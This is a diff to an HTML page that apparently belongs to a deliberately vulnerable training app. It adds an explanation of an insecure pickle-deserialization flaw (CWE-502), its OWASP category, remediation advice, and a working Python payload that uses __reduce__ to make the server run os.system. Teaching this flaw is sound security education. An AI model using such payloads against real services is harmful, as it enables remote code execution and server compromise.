@@ -13,6 +13,19 @@
         <li>The server will run your payload when it calls <code>pickle.loads()</code>. Fix: don’t deserialize untrusted data with pickle; use JSON or a format that doesn’t execute code.</li>
     </ul>
 </details>
+<div class="exploit-details">
+    <p><strong>OWASP:</strong> A08:2021 Software and Data Integrity Failures (CWE-502)</p>
+    <p><strong>Impact:</strong> Remote code execution on the server; full compromise of the app and possibly the host.</p>
+    <details><summary>Example payload (Python)</summary>
+        <pre>import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+print(base64.b64encode(pickle.dumps(RCE())).decode())</pre>
+        <p>Submit the printed string in the form.</p>
+    </details>
+    <p><strong>Remediation:</strong> Never deserialize untrusted data with pickle/yaml.unsafe_load/Java ObjectInputStream; use JSON or signed/schema-validated formats.</p>
+</div>
 <form method="post">
     <label>Base64 pickle data: <textarea name="data" rows="3"></textarea></label>
     <button type="submit">Deserialize</button>
